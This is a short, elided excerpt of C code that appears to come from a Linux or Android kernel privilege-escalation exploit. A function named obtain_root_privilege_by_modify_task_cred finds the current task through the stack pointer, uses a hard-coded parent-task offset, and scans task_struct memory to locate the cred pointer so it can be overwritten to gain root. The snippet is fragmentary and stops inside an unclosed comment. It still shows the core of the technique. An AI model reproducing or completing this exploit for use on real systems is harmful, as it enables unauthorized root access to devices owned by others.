...
{
  uint32_t dumy = 0;
  uint32_t sp = (unsigned long)&dumy;
...
int32_t real_parent_tsk_offset = 0x278;
int32_t cred_offset = 0;
...
obtain_root_privilege_by_modify_task_cred(void)
{
  ...
  for (i = 0; i < 0x400; i+= 4) {
    ...
    if (is_cpu_timer_valid(&task->cpu_timers[0])
     ...
     && task->real_cred == task->cred) {
      cred = task->cred;
      cred_offset = (unsigned int)(&task->cred) - (unsigned int)(info->task);
      break;
    }
  }
  ...
  /*
  unsigned int current_task = (unsigned int)(info->task);
  unsigned int real_parent_task = *(unsigned int *)(current_task + real_parent_tsk_offset);
  cred = *(struct cred**)(real_parent_task + cred_offset);
